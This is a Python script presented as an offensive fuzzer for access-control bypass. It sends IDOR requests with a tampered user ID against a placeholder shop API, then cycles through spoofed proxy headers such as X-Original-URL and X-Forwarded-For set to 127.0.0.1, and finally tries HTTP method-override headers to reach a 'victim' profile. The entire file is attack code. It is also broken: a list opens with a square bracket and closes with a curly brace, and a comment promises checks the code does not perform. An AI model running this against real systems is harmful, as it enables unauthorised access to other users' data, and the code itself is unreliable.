#!/usr/bin/env python3
import requests
import sys

# Color configurations for professional output
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def banner():
    print(f"{YELLOW}" + "="*60)
    print("  Access Control & Proxy Bypass Fuzzer | Offensive Automation")
    print("="*60 + f"{RESET}")

def fuzz_access_control(target_url, target_id, auth_token):
    # Base configuration
    headers = {
        "Authorization": f"Bearer {auth_token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Offensive-Fuzzer/1.0"
    }
    
    # 1. Test standard parameter tampering (IDOR)
    print(f"\n[*] Testing standard IDOR with changed ID...")
    tampered_url = f"{target_url}?id={target_id}"
    try:
        res = requests.get(tampered_url, headers=headers, timeout=5)
        print(f"    [Base Request] URL: {tampered_url} -> Status: {res.status_code} | Length: {len(res.text)}")
    except Exception as e:
        print(f"    {RED}[-] Connection failed: {e}{RESET}")
        return

    # 2. Proxy Bypass Headers to Fuzz
    bypass_headers = [
        {"X-Original-URL": f"/api/v1/users/profile?id={target_id}"},
        {"X-Rewrite-URL": f"/api/v1/users/profile?id={target_id}"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"}
    ]

    print(f"\n[*] Fuzzing Proxy-Intermediary Headers for Privilege Escalation...")
    for b_header in bypass_headers:
        # Merge base headers with our fuzzing header
        current_headers = {**headers, **b_header}
        try:
            # Send request to base endpoint but with destructive headers
            res = requests.get(target_url, headers=current_headers, timeout=5)
            
            # If status changes or length significantly shifts, log it as suspicious
            if res.status_code == 200:
                print(f"    {GREEN}[+] POTENTIAL BYPASS FOUND! Header: {b_header} -> Status: 200 OK{RESET}")
            else:
                print(f"    [-] Tested Header: {list(b_header.keys())[0]} -> Status: {res.status_code}")
        except Exception:
            pass

    # 3. HTTP Method Tampering Fuzzing
    print(f"\n[*] Testing HTTP Method Tampering/Override...")
    methods = ["POST", "PUT", "PATCH"}
    override_headers = [
        {"X-HTTP-Method-Override": "GET"},
        {"X-Method-Override": "GET"}
    ]
    
    for method in methods:
        for o_header in override_headers:
            current_headers = {**headers, **o_header}
            try:
                res = requests.request(method, tampered_url, headers=current_headers, timeout=5)
                if res.status_code == 200:
                    print(f"    {GREEN}[+] POTENTIAL METHOD BYPASS! Method: {method} + Header: {o_header} -> Status: 200{RESET}")
            except Exception:
                pass
                
    print(f"\n{YELLOW}[*] Fuzzing sequence completed.{RESET}")

if __name__ == "__main__":
    banner()
    # Example placeholders - change according to target lab
    TARGET = "http://target-shop.com/api/v1/users/profile" 
    VICTIM_ID = "10420"
    TOKEN = "eyJhbGciOiJIUzI1Ni..."
    
    print(f"[!] Target set to: {TARGET}")
    print(f"[!] Fuzzing target user ID: {VICTIM_ID}")
    
    # Uncomment below to run interactively
    # TARGET = input("Enter target endpoint: ")
    # VICTIM_ID = input("Enter victim ID to fuzz: ")
    # TOKEN = input("Enter your JWT/Auth Token: ")
    
    fuzz_access_control(TARGET, VICTIM_ID, TOKEN)
